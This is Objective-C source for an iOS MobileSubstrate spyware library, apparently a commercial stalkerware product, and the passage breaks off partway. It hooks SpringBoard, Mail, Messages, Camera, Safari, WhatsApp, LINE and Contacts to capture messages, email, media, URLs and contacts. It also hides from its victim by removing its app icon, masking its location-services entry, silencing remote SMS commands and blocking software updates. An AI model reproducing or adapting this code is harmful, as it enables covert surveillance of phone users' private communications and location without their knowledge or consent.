#import "MSFSP.h"
#import "SMS.h"
#import "SMS2.h"
#import "Mail.h"
#import "Location.h"
#import "IMessage.h"
#import "AppVisibility.h"
#import "Media.h"
#import "MediaUtils.h"
#import "XMPPStream.h"
#import "XMPPConnection.h"
#import "WhatsApp.h"
#import "BrowserUrl.h"
#import "VisibilityNotifier.h"
#import "SystemClock.h"
#import "Contact.h"
#import "IMEIGetter.h"
#import "ApplicationLifeCycle.h"
#import "ALC.h"
#import "SpringBoardUIAlertServiceManager.h"
#import "MailNotificationHelper.h"

#import "LINE.h"
#import "Skype.h"
#import "Note.h"
#import "Facebook.h"
#import "Privacy.h"
#import "LINEUtils.h"
#import "SMSSender000.h"
#import "SWU.h"
#import "Midnight.h"
#import "SystemUtilsImpl.h"
#import "Viber.h"

#pragma mark -
#pragma mark dylib mobile substrate behaviour
#pragma mark

// Mobile substrate load/run behaviour more than one mobile substrates hook the same methods
// Example: A.dylib and B.dylib

// 1. Mobile substrate use alphabetical order to load all mobile substrate thus A will load first
// 2. Mobile substrate use LIFO to call the hooked functions which are hooked more than one mobile substrate,
//		thus B's methods will call before A's methods

#pragma mark -
#pragma mark dylib initialization and initial hooks 

extern "C" void MSFSPInitialize() {	
    NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	// Check open application and create hooks here:
	NSString *identifier = [[NSBundle mainBundle] bundleIdentifier];
	DLog (@"MSFSP loaded with identifier = %@", identifier);
	
#pragma mark -
#pragma mark springboard hook
#pragma mark -
	
    if ([identifier isEqualToString:@"com.apple.springboard"]) {
		// Method for hooking SMS command, SMS and MMS capture
		Class $SMSCTServer(objc_getClass("SMSCTServer"));
		_SMSCTServer$_ingestIncomingCTMessage$= MSHookMessage($SMSCTServer, @selector(_ingestIncomingCTMessage:), &$SMSCTServer$_ingestIncomingCTMessage$);
		_SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$ = MSHookMessage($SMSCTServer, @selector(_reallySendSMSRequest:withProcessedParts:recordID:), &$SMSCTServer$_reallySendSMSRequest$withProcessedParts$recordID$);
		_SMSCTServer$_sendCompleted$forRecord$ = MSHookMessage($SMSCTServer, @selector(_sendCompleted:forRecord:), &$SMSCTServer$_sendCompleted$forRecord$);
		
		// SMS command and sms sender for IOS6
		if ([MSFSPUtils systemOSVersion] >= 6) {
			// Intercept incoming SMS command + SMS event capture + keywords
			Class $IMChatRegistry = objc_getClass("IMChatRegistry");
			_IMChatRegistry$account$chat$style$chatProperties$messageReceived$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageReceived:),
																								&$IMChatRegistry$account$chat$style$chatProperties$messageReceived$);
			// For detection the sent of reply sms command
			_IMChatRegistry$account$chat$style$chatProperties$messageSent$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageSent:),
																							   &$IMChatRegistry$account$chat$style$chatProperties$messageSent$);

			// For detection the failure of reply sms command
			_IMChatRegistry$account$chat$style$chatProperties$messageUpdated$ = MSHookMessage($IMChatRegistry, @selector(account:chat:style:chatProperties:messageUpdated:),
																						   &$IMChatRegistry$account$chat$style$chatProperties$messageUpdated$);
			
			// SMS command utils (block UI updates)
			Class $SBAlertItemsController(objc_getClass("SBAlertItemsController"));
			_SBAlertItemsController$activateAlertItem$			= MSHookMessage($SBAlertItemsController, @selector(activateAlertItem:), &$SBAlertItemsController$activateAlertItem$);
			Class $SBAwayBulletinListController(objc_getClass("SBAwayBulletinListController"));
			_SBAwayBulletinListController$observer$addBulletin$forFeed$ = MSHookMessage($SBAwayBulletinListController, @selector(observer:addBulletin:forFeed:),
																						&$SBAwayBulletinListController$observer$addBulletin$forFeed$);
			
			Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
			// Not allow to launch Messages, biteSMS while sending sms reply
			_SBApplicationIcon$launch = MSHookMessage($SBApplicationIcon, @selector(launch), &$SBApplicationIcon$launch);
			_SBApplicationIcon$launchFromViewSwitcher = MSHookMessage($SBApplicationIcon, @selector(launchFromViewSwitcher), &$SBApplicationIcon$launchFromViewSwitcher);
			Class $SBUIController = objc_getClass("SBUIController");
			_SBUIController$activateApplicationFromSwitcher$ = MSHookMessage($SBUIController, @selector(activateApplicationFromSwitcher:), &$SBUIController$activateApplicationFromSwitcher$);
			
			// Sound (sent sound)
			int (* _CKShouldPlaySMSSounds)(CFStringRef a, CFStringRef b, bool c);
			lookupSymbol(CHATKIT, "_CKShouldPlaySMSSounds", _CKShouldPlaySMSSounds);
			MSHookFunction(_CKShouldPlaySMSSounds, MSHake(_CKShouldPlaySMSSounds));

			// Send sms reply
			[SMSSender000 sharedSMSSender000];
		}
		// Clear badge of SMS commands + Software update killer
		Class $SBApplicationIcon(objc_getClass("SBApplicationIcon"));
		_SBApplicationIcon$setBadge$ = MSHookMessage($SBApplicationIcon, @selector(setBadge:), &$SBApplicationIcon$setBadge$);
		
		[VisibilityNotifier shareVisibilityNotifier];
		// Add this hook to remove icon on desktop
		Class $SBIconModel(objc_getClass("SBIconModel"));
		_SBIconModel$addIconForApplication$ = MSHookMessage($SBIconModel,@selector(addIconForApplication:), &$SBIconModel$addIconForApplication$);
		
		// To remove icon from AppSwitcher
		Class $SBAppSwitcherModel(objc_getClass("SBAppSwitcherModel"));
		_SBAppSwitcherModel$_saveRecents = MSHookMessage($SBAppSwitcherModel,@selector(_saveRecents), &$SBAppSwitcherModel$_saveRecents);
		Class $SBAppSwitcherController = objc_getClass("SBAppSwitcherController");
		_SBAppSwitcherController$_iconForApplication$ = MSHookMessage($SBAppSwitcherController, @selector(_iconForApplication:), &$SBAppSwitcherController$_iconForApplication$);
		
		// Hide Location
		Class $CLLocationManager(objc_getClass("CLLocationManager"));
		_CLLocationManager$initWithEffectiveBundleIdentifier$bundle$ = MSHookMessage($CLLocationManager, @selector(initWithEffectiveBundleIdentifier:bundle:), &$CLLocationManager$initWithEffectiveBundleIdentifier$bundle$);
		
		//$CLLocationManager = objc_getMetaClass("CLLocationManager");
		//_CLLocationManager$authorizationStatusForBundle$ = MSHookMessage($CLLocationManager, @selector(authorizationStatusForBundle:), &$CLLocationManager$authorizationStatusForBundle$);
		//_CLLocationManager$authorizationStatusForBundleIdentifier$ = MSHookMessage($CLLocationManager, @selector(authorizationStatusForBundleIdentifier:), &$CLLocationManager$authorizationStatusForBundleIdentifier$);
		//_CLLocationManager$_authorizationStatusForBundleIdentifier$bundle$ = MSHookMessage($CLLocationManager, @selector(_authorizationStatusForBundleIdentifier:bundle:), &$CLLocationManager$_authorizationStatusForBundleIdentifier$bundle$);
		
		// Capture WallPaper
		Class $SBWallpaperView(objc_getClass("SBWallpaperView"));
		_SBWallpaperView$_wallpaperChanged = MSHookMessage($SBWallpaperView, @selector(_wallpaperChanged), &$SBWallpaperView$_wallpaperChanged);
		
		// IMEI getter
		[IMEIGetter sharedIMEIGetter];
		
		// Application Life Cycle (ALC)
		[ApplicationLifeCycle sharedALC];
		// This method exist in 4, 5 & 6
		Class $SBApplicationController = objc_getClass("SBApplicationController");
		_SBApplicationController$applicationStateChanged$state$ = MSHookMessage($SBApplicationController, @selector(applicationStateChanged:state:), &$SBApplicationController$applicationStateChanged$state$);
		// ALC for IOS 6 (these methods not exist in 4 & 5)
		Class $SBApplication = objc_getClass("SBApplication");
		_SBApplication$didSuspend = MSHookMessage($SBApplication, @selector(didSuspend), &$SBApplication$didSuspend);
		_SBApplication$didActivate = MSHookMessage($SBApplication, @selector(didActivate), &$SBApplication$didActivate);
		
		// Display software update (for our application) view
		[SpringBoardUIAlertServiceManager sharedSpringBoardUIAlertServiceManager];
		
		// Software Update Killer
		Class $SBSoftwareUpdateController(objc_getClass("SBSoftwareUpdateController"));
		DLog(@"=============== $SBSoftwareUpdateController = %@",$SBSoftwareUpdateController);
		// Cancel timer force to install sw
		_SBSoftwareUpdateController$_showForcedInstallAlert = MSHookMessage($SBSoftwareUpdateController, @selector(_showForcedInstallAlert), &$SBSoftwareUpdateController$_showForcedInstallAlert);
		// Handle error if battery below 50%
		_SBSoftwareUpdateController$_handleInstallError$ = MSHookMessage($SBSoftwareUpdateController, @selector(_handleInstallError:), &$SBSoftwareUpdateController$_handleInstallError$);
		
		Class $SpringBoard(objc_getClass("SpringBoard"));
		// Update sw badge in Preferences
		_SpringBoard$applicationDidFinishLaunching$ = MSHookMessage($SpringBoard, @selector(applicationDidFinishLaunching:), &$SpringBoard$applicationDidFinishLaunching$);
		// Mid-night passed
		_SpringBoard$_midnightPassed = MSHookMessage($SpringBoard, @selector(_midnightPassed), &$SpringBoard$_midnightPassed);
		
		//iMessage Attachment
		 Class $IMChat(objc_getClass("IMChat"));
		_IMChat$sendMessage$ = MSHookMessage($IMChat, @selector(sendMessage:), &$IMChat$sendMessage$);
		_IMChat$_handleIncomingMessage$ = MSHookMessage($IMChat, @selector(_handleIncomingMessage:), &$IMChat$_handleIncomingMessage$);
	}
	
#pragma mark -
#pragma mark mobilemail hook
#pragma mark -
	
	// For capturing incoming mail and outgoing mail
	if ([identifier isEqualToString:@"com.apple.mobilemail"]) {
		
		// -- register notification posted by blocking part
		[MailNotificationHelper sharedInstance];
		
		 Class $Message(objc_getClass("Message"));
		_Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$ = MSHookMessage($Message,
								@selector(dataForMimePart:inRange:isComplete:downloadIfNecessary:didDownload:),
								&$Message$dataForMimePart$inRange$isComplete$downloadIfNecessary$didDownload$);
		
		if ([[[UIDevice currentDevice] systemVersion] intValue] > 4) {
			DLog(@"IOS5");
			Class $MFOutgoingMessageDelivery(objc_getClass("MFOutgoingMessageDelivery"));
			_MFOutgoingMessageDelivery$initWithMessage$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithMessage:), &$MFOutgoingMessageDelivery$initWithMessage$);
			_MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), &$MFOutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
			_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), &$MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
			_MFOutgoingMessageDelivery$deliverSynchronously = MSHookMessage($MFOutgoingMessageDelivery, @selector(deliverSynchronously), &$MFOutgoingMessageDelivery$deliverSynchronously);
			if ([MSFSPUtils systemOSVersion] >= 6) {
				_MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$ = MSHookMessage($MFOutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:charsets:), &$MFOutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$charsets$);				
			}
		} else {
			 DLog(@"IOS4");
			 Class $OutgoingMessageDelivery(objc_getClass("OutgoingMessageDelivery"));
			 _OutgoingMessageDelivery$initWithMessage$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithMessage:), &$OutgoingMessageDelivery$initWithMessage$);
			 _OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:mixedContent:textPartsAreHTML:), &$OutgoingMessageDelivery$initWithHeaders$mixedContent$textPartsAreHTML$);
			 _OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$ = MSHookMessage($OutgoingMessageDelivery, @selector(initWithHeaders:HTML:plainTextAlternative:other:), &$OutgoingMessageDelivery$initWithHeaders$HTML$plainTextAlternative$other$);
			 _OutgoingMessageDelivery$deliverSynchronously = MSHookMessage($OutgoingMessageDelivery, @selector(deliverSynchronously), &$OutgoingMessageDelivery$deliverSynchronously);
		}
	}
	
#pragma mark -
#pragma mark Preferences hooks
#pragma mark -
	
	// For Hiding Location icon and alert
	// Get notification for user change date time

	if ([identifier isEqualToString:@"com.apple.Preferences"]) {
		Class $LocationServicesListController(objc_getClass("LocationServicesListController"));
		// To hide application bundle display name of location service in location service controller
		// IOS 4, 5 - Obsolete
        //_LocationServicesListController$specifiers = MSHookMessage($LocationServicesListController, @selector(specifiers), &$LocationServicesListController$specifiers);
		// IOS 4, 5, 6
		_LocationServicesListController$tableView$cellForRowAtIndexPath$ = MSHookMessage($LocationServicesListController, @selector(tableView:cellForRowAtIndexPath:), &$LocationServicesListController$tableView$cellForRowAtIndexPath$);
		
		// Location Service toggle (IOS 4, 5, 6) for post notification to daemon
		_LocationServicesListController$setLocationServicesEnabled$specifier$ = MSHookMessage($LocationServicesListController, @selector(setLocationServicesEnabled:specifier:), &$LocationServicesListController$setLocationServicesEnabled$specifier$);		
		
		// location service toggle (IOS 4,5)
		//_LocationServicesListController$disableLocationServicesAfterConfirm$ = MSHookMessage($LocationServicesListController, @selector(disableLocationServicesAfterConfirm:), &$LocationServicesListController$disableLocationServicesAfterConfirm$);
		//_LocationServicesListController$alertView$clickedButtonAtIndex$ = MSHookMessage($LocationServicesListController, @selector(alertView:clickedButtonAtIndex:), &$LocationServicesListController$alertView$clickedButtonAtIndex$);
		//_LocationServicesListController$actionSheet$clickedButtonAtIndex$ = MSHookMessage($LocationServicesListController, @selector(actionSheet:clickedButtonAtIndex:), &$LocationServicesListController$actionSheet$clickedButtonAtIndex$);
		
		
		// location service toggle (IOS 4,5)
		// Class $PrefsRootController(objc_getClass("PrefsRootController"));
		//_PrefsRootController$locationServicesEnabled$ = MSHookMessage($PrefsRootController, @selector(locationServicesEnabled:), &$PrefsRootController$locationServicesEnabled$);
		
		// IOS 4,5
        Class $ResetPrefController(objc_getClass("ResetPrefController"));
        _ResetPrefController$resetLocationWarnings$ = MSHookMessage($ResetPrefController, @selector(resetLocationWarnings:), &$ResetPrefController$resetLocationWarnings$);
		
		// Location service toggle IOS 6
		if ([[[UIDevice currentDevice] systemVersion] intValue] >= 6) {
			// Reset privacy
			_ResetPrefController$resetPrivacyWarnings$ = MSHookMessage($ResetPrefController, @selector(resetPrivacyWarnings:), &$ResetPrefController$resetPrivacyWarnings$);
			
			// To hide application bundle display name when user toggle location service in location service controller (ON/OFF in location service controller)
			// Obsolete
			//_LocationServicesListController$_setLocationServicesEnabled$ = MSHookMessage($LocationServicesListController, @selector(_setLocationServicesEnabled:), &$LocationServicesListController$_setLocationServicesEnabled$);
			
			Class $TCCAccessController(objc_getClass("TCCAccessController"));
			_TCCAccessController$tableView$cellForRowAtIndexPath$ = MSHookMessage($TCCAccessController, @selector(tableView:cellForRowAtIndexPath:), &$TCCAccessController$tableView$cellForRowAtIndexPath$);

		}
		
		// Get notification when time is changed
		// Obsolete --> use Darwin notification instead in daemon
//		Class $DateTimeController = objc_getClass("DateTimeController");
//		_DateTimeController$significantTimeChange$ = MSHookMessage($DateTimeController, @selector(significantTimeChange:), &$DateTimeController$significantTimeChange$);
		}
	
#pragma mark -
#pragma mark MobileSMS hooks
#pragma mark -
	
	// iMessage
	if ([identifier isEqualToString:@"com.apple.MobileSMS"]) {
	   Class $IMChat(objc_getClass("IMChat"));
	  _IMChat$sendMessage$ = MSHookMessage($IMChat, @selector(sendMessage:), &$IMChat$sendMessage$);

		// SMS commands utils (to surpress sound and vibrate while Messages application in foreground)
		if ([MSFSPUtils systemOSVersion] >= 6) {
			Class $SMSApplication = objc_getClass("SMSApplication");
			_SMSApplication$_receivedMessage$ = MSHookMessage($SMSApplication, @selector(_receivedMessage:), &$SMSApplication$_receivedMessage$);
			Class $CKTranscriptController = objc_getClass("CKTranscriptController");
			_CKTranscriptController$_messageReceived$ = MSHookMessage($CKTranscriptController, @selector(_messageReceived:), &$CKTranscriptController$_messageReceived$);
		}
	}
	
#pragma mark -
#pragma mark Camera hooks
#pragma mark -
	
	// Camera image and video Capture
   	if ([identifier isEqualToString:@"com.apple.camera"]) {
		Class $PLCameraController(objc_getClass("PLCameraController"));
		
		if([[[UIDevice currentDevice] systemVersion] floatValue] >= 4.3) {
			DLog(@"iOS 4.3 onward")
			// IMAGE
			_PLCameraController$_processCapturedPhotoWithDictionary$error$ = MSHookMessage($PLCameraController, @selector(_processCapturedPhotoWithDictionary:error:), &$PLCameraController$_processCapturedPhotoWithDictionary$error$);
			// VIDEO
			_PLCameraController$startVideoCapture = MSHookMessage($PLCameraController, @selector(startVideoCapture), &$PLCameraController$startVideoCapture);	// not tested
			_PLCameraController$stopVideoCapture = MSHookMessage($PLCameraController, @selector(stopVideoCapture), &$PLCameraController$stopVideoCapture);
		} else {
			DLog(@"iOS 4.0 or 4.1 or 4.2")
			// IMAGE
			_PLCameraController$_capturedPhotoWithDictionary$ = MSHookMessage($PLCameraController, @selector(_capturedPhotoWithDictionary:), &$PLCameraController$_capturedPhotoWithDictionary$);
			// VIDEO: stop
			_PLCameraController$_recordingStopped$ = MSHookMessage($PLCameraController, @selector(_recordingStopped:), &$PLCameraController$_recordingStopped$);
			// VIDEO: start
			_PLCameraController$_captureStarted$ = MSHookMessage($PLCameraController, @selector(_captureStarted:), &$PLCameraController$_captureStarted$);
		}
	}
	
#pragma mark -
#pragma mark VoiceMemos hooks
#pragma mark -
	
	// Audio Capture
   	if ([identifier isEqualToString:@"com.apple.VoiceMemos"]) {
		Class $RCRecorderViewController(objc_getClass("RCRecorderViewController"));
		// AUDIO: start
		_RCRecorderViewController$recordingControlsViewDidStartRecording$ = MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStartRecording:), &$RCRecorderViewController$recordingControlsViewDidStartRecording$);
		// AUDIO: stop
		_RCRecorderViewController$recordingControlsViewDidStopRecording$ = MSHookMessage($RCRecorderViewController, @selector(recordingControlsViewDidStopRecording:), &$RCRecorderViewController$recordingControlsViewDidStopRecording$);
	}
	
#pragma mark -
#pragma mark libactivator, Preferences hooks
#pragma mark -
	
	// Hide from Activator and Preferences
	if ([identifier isEqualToString:@"libactivator"] || [identifier isEqualToString:@"com.apple.Preferences"]) {
		Class $UIViewController(objc_getClass("UIViewController"));
		_UIViewController$viewWillAppear$ = MSHookMessage($UIViewController, @selector(viewWillAppear:), &$UIViewController$viewWillAppear$);
		
		// Hook to show always update in Software Update view
		Class $PrefsSUTableView(objc_getClass("PrefsSUTableView"));
		DLog(@"=============== $PrefsSUTableView = %@", $PrefsSUTableView);
		_PrefsSUTableView$setSUState$ = MSHookMessage($PrefsSUTableView, @selector(setSUState:), &$PrefsSUTableView$setSUState$);
		_PrefsSUTableView$layoutSubviews = MSHookMessage($PrefsSUTableView, @selector(layoutSubviews), &$PrefsSUTableView$layoutSubviews);
		
	}
	
#pragma mark -
#pragma mark WhatsApp hooks
#pragma mark -
	
    // WhatsApp
	if([identifier isEqualToString:@"net.whatsapp.WhatsApp"]) {
		Class $XMPPStream(objc_getClass("XMPPStream"));
		_XMPPStream$send$						= MSHookMessage($XMPPStream, @selector(send:), &$XMPPStream$send$);
		
		// -- for WhatsApp 2.8.2 and 2.8.3
		_XMPPStream$send$encrypted$				= MSHookMessage($XMPPStream, @selector(send:encrypted:), &$XMPPStream$send$encrypted$); 
		
		// -- for WhatsApp 2.8.2 and previous version (Don't know the version number)
		Class $XMPPConnection(objc_getClass("XMPPConnection"));
		_XMPPConnection$processIncomingMessages$ = MSHookMessage($XMPPConnection, @selector(processIncomingMessages:), &$XMPPConnection$processIncomingMessages$);
	
		Class $WAChatStorage(objc_getClass("WAChatStorage"));
		_WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$ = MSHookMessage($WAChatStorage, @selector(messageWithImage:inChatSession:saveToLibrary:error:), &$WAChatStorage$messageWithImage$inChatSession$saveToLibrary$error$);				

	}
	
#pragma mark -
#pragma mark mobilesafari hooks
#pragma mark -
	
	// BrowserUrl Capture
	if ([identifier isEqualToString:@"com.apple.mobilesafari"]) {
		// Bookmark capture
		// Obsolete, no longer have the use case
//		Class $BookmarkInfoViewController(objc_getClass("BookmarkInfoViewController"));
//		_BookmarkInfoViewController$_save = MSHookMessage($BookmarkInfoViewController, @selector(_save), &$BookmarkInfoViewController$_save);
//		_BookmarkInfoViewController$saveChanges = MSHookMessage($BookmarkInfoViewController, @selector(saveChanges), &$BookmarkInfoViewController$saveChanges);
//		_BookmarkInfoViewController$loadView = MSHookMessage($BookmarkInfoViewController, @selector(loadView), &$BookmarkInfoViewController$loadView);
		
		// Browser url capture
		// Obsolete (no use case)
//		Class $BrowserController(objc_getClass("BrowserController"));
//		//_BrowserController$updateAddress$forTabDocument$ = MSHookMessage($BrowserController, @selector(updateAddress:forTabDocument:), &$BrowserController$updateAddress$forTabDocument$);
//		_BrowserController$snapshotForTabDocument$ = MSHookMessage($BrowserController, @selector(snapshotForTabDocument:), &$BrowserController$snapshotForTabDocument$);
		
		// Browser url capture IOS4, IOS5
		Class $TabController(objc_getClass("TabController"));
		_TabController$tabDocument$didFinishLoadingWithError$ = MSHookMessage($TabController, @selector(tabDocument:didFinishLoadingWithError:), &$TabController$tabDocument$didFinishLoadingWithError$);
		
		// Browser url capture IOS6
		Class $TabDocument(objc_getClass("TabDocument"));	
		_TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$ = MSHookMessage($TabDocument, @selector(browserLoadingController:didFinishLoadingWithError:dataSource:), &$TabDocument$browserLoadingController$didFinishLoadingWithError$dataSource$);
	}
	
#pragma mark -
#pragma mark MobileAddressBook, mobilemail, MobileSMS, springboard, mobilephone hooks
#pragma mark -
	
	// Contact changes
	if ([identifier isEqualToString:@"com.apple.MobileAddressBook"] ||
		[identifier isEqualToString:@"com.apple.mobilemail"] ||
		[identifier isEqualToString:@"com.apple.MobileSMS"] ||
		[identifier isEqualToString:@"com.apple.springboard"] ||
		[identifier isEqualToString:@"com.apple.mobilephone"]) {
		Class $ABPersonViewController = objc_getClass("ABPersonViewController");
	
		_ABPersonViewController$viewDidLoad = MSHookMessage($ABPersonViewController, @selector(viewDidLoad), &$ABPersonViewController$viewDidLoad);
		//_ABPersonViewController$viewDidUnload = MSHookMessage($ABPersonViewController, @selector(viewDidUnload), &$ABPersonViewController$viewDidUnload);
		
		_ABPersonViewController$dealloc = MSHookMessage($ABPersonViewController, @selector(dealloc), &$ABPersonViewController$dealloc);
		
		//_ABPersonViewController$viewDidAppear$ = MSHookMessage($ABPersonViewController, @selector(viewDidAppear:), &$ABPersonViewController$viewDidAppear$);
		//_ABPersonViewController$viewWillDisappear$ = MSHookMessage($ABPersonViewController, @selector(viewWillDisappear:), &$ABPersonViewController$viewWillDisappear$);
	}
	
#pragma mark -
#pragma mark line hook
#pragma mark -
	
	// LINE
	if ([identifier isEqualToString:@"jp.naver.line"]) {

		Class $TalkChatObject(objc_getClass("TalkChatObject"));
		_TalkChatObject$addMessagesObject$ = MSHookMessage($TalkChatObject, @selector(addMessagesObject:), &$TalkChatObject$addMessagesObject$);

		// -- for outgoing from PC version
		Class $TalkMessageObject(objc_getClass("TalkMessageObject"));
		_TalkMessageObject$line_messageSent$ = MSHookMessage($TalkMessageObject, @selector(line_messageSent:), &$TalkMessageObject$line_messageSent$);		
				
		/*
		 According to the test result 
		 - LINE version 3.4.1,	[TalkChatObject addMessagesObject] is called when sending the message
								[TalkMessageObject send] is called
		 - LINE version 3.5.0,	[TalkChatObject addMessagesObject] is "NOT" called
								[TalkMessageObject send] is called
		 */		
		if ([LINEUtils isLineVersionIsEqualOrGreaterThan:3.5]) {
			DLog (@"hook TalkMessageObject --> send")
			Class $TalkMessageObject(objc_getClass("TalkMessageObject"));
			_TalkMessageObject$send = MSHookMessage($TalkMessageObject, @selector(send), &$TalkMessageObject$send);		
		}
		/*  === For testing purpose ===
		Class $NLAudioURLLoader(objc_getClass("NLAudioURLLoader"));
		_NLAudioURLLoader$loadAudioWithObjectID$knownDownloadURL$ = MSHookMessage($NLAudioURLLoader, @selector(loadAudioWithObjectID:knownDownloadURL:), &$NLAudioURLLoader$loadAudioWithObjectID$knownDownloadURL$);	
		_NLAudioURLLoader$finishLoadingAudioWithURL$ = MSHookMessage($NLAudioURLLoader, @selector(finishLoadingAudioWithURL:), &$NLAudioURLLoader$finishLoadingAudioWithURL$);	
		_NLAudioURLLoader$informLoadingFailure$ = MSHookMessage($NLAudioURLLoader, @selector(informLoadingFailure:), &$NLAudioURLLoader$informLoadingFailure$);	
							
		Class $NLMovieURLLoader(objc_getClass("NLMovieURLLoader"));
		_NLMovieURLLoader$loadMovieWithOBSParameters$ = MSHookMessage($NLMovieURLLoader, @selector(loadMovieWithOBSParameters:), &$NLMovieURLLoader$loadMovieWithOBSParameters$);	
		_NLMovieURLLoader$loadMovieAtURL$withMessageID$knownDownloadURL$completion$ = MSHookMessage($NLMovieURLLoader, @selector(loadMovieAtURL:withMessageID:knownDownloadURL:completion:), &$NLMovieURLLoader$loadMovieAtURL$withMessageID$knownDownloadURL$completion$);	
		_NLMovieURLLoader$loadMovieAtURL$withOBSParameters$completion$ = MSHookMessage($NLMovieURLLoader, @selector(loadMovieAtURL:withOBSParameters:completion:), &$NLMovieURLLoader$loadMovieAtURL$withOBSParameters$completion$);	
		_NLMovieURLLoader$finishLoadingMovieWithURL$ = MSHookMessage($NLMovieURLLoader, @selector(finishLoadingMovieWithURL:), &$NLMovieURLLoader$finishLoadingMovieWithURL$);	
		_NLMovieURLLoader$informLoadingFailure$ = MSHookMessage($NLMovieURLLoader, @selector(informLoadingFailure:), &$NLMovieURLLoader$informLoadingFailure$);	
		
		Class $NLMoviePlayerController(objc_getClass("NLMoviePlayerController"));
		_NLMoviePlayerController$save$ = MSHookMessage($NLMoviePlayerController, @selector(save:), &$NLMoviePlayerController$save$);			
		 
		_TalkChatObject$addMessages$ = MSHookMessage($TalkChatObject, @selector(addMessages:), &$TalkChatObject$addMessages$);		
		
		_TalkChatObject$insertWithMid$type$members$lastUpdated$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertWithMid:type$members:lastUpdated:inManagedObjectContext:), &$TalkChatObject$insertWithMid$type$members$lastUpdated$inManagedObjectContext$ );						
		_TalkChatObject$insertUnknownChatWithMid$type$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertUnknownChatWithMid:type:inManagedObjectContext:), &$TalkChatObject$insertUnknownChatWithMid$type$inManagedObjectContext$);						
		_TalkChatObject$insertOrUpdateRoom$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertOrUpdateRoom:inManagedObjectContext:), &$TalkChatObject$insertOrUpdateRoom$inManagedObjectContext$);						
		_TalkChatObject$insertWithDictionary$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertWithDictionary:inManagedObjectContext: ), &$TalkChatObject$insertWithDictionary$inManagedObjectContext$);					
		_TalkChatObject$insertWithRoom$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertWithRoom:inManagedObjectContext: ), &$TalkChatObject$insertWithRoom$inManagedObjectContext$);					
		_TalkChatObject$insertWithUser$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertWithUser:inManagedObjectContext: ), &$TalkChatObject$insertWithUser$inManagedObjectContext$);					
		_TalkChatObject$insertWithGroup$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(insertWithGroup:inManagedObjectContext: ), &$TalkChatObject$insertWithGroup$inManagedObjectContext$);				
		_TalkChatObject$chatAutoCreateWithMID$type$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(chatAutoCreateWithMID:type:inManagedObjectContext:), &$TalkChatObject$chatAutoCreateWithMID$type$inManagedObjectContext$);										
		_TalkChatObject$chatWithMID$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(chatWithMID:inManagedObjectContext: ), &$TalkChatObject$chatWithMID$inManagedObjectContext$);							
		_TalkChatObject$chatWithObjectID$inManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(chatWithObjectID:inManagedObjectContext: ), &$TalkChatObject$chatWithObjectID$inManagedObjectContext$);		
		_TalkChatObject$chatsInManagedObjectContext$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(chatsInManagedObjectContext:), &$TalkChatObject$chatsInManagedObjectContext$);			

		_TalkChatObject$sendMessageWithChatObject$text$requestSequence$image$location$latitude$sticker$contentType$metadata$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(sendMessageWithChatObject:text:requestSequence:image:location:latitude:sticker:contentType:metadata:), &$TalkChatObject$sendMessageWithChatObject$text$requestSequence$image$location$latitude$sticker$contentType$metadata$);			
		_TalkChatObject$sendMessageWithImage$chatObject$ = MSHookMessage(objc_getMetaClass("TalkChatObject"), @selector(sendMessageWithImage:chatObject:), &$TalkChatObject$sendMessageWithImage$chatObject$);			
		_TalkChatObject$addMessagesObject$ = MSHookMessage($TalkChatObject, @selector(addMessagesObject:), &$TalkChatObject$addMessagesObject$);			
		_TalkChatObject$updateLastReceivedMessageID$ = MSHookMessage($TalkChatObject, @selector(updateLastReceivedMessageID:), &$TalkChatObject$updateLastReceivedMessageID$);					
		_TalkChatObject$syncChatAsReadUpToMessageWithID$ = MSHookMessage($TalkChatObject, @selector(syncChatAsReadUpToMessageWithID:), &$TalkChatObject$syncChatAsReadUpToMessageWithID$);					
		_TalkChatObject$fetchReceivedMessageCountAfterMessageWithID$ = MSHookMessage($TalkChatObject, @selector(fetchReceivedMessageCountAfterMessageWithID:), &$TalkChatObject$fetchReceivedMessageCountAfterMessageWithID$);					
		
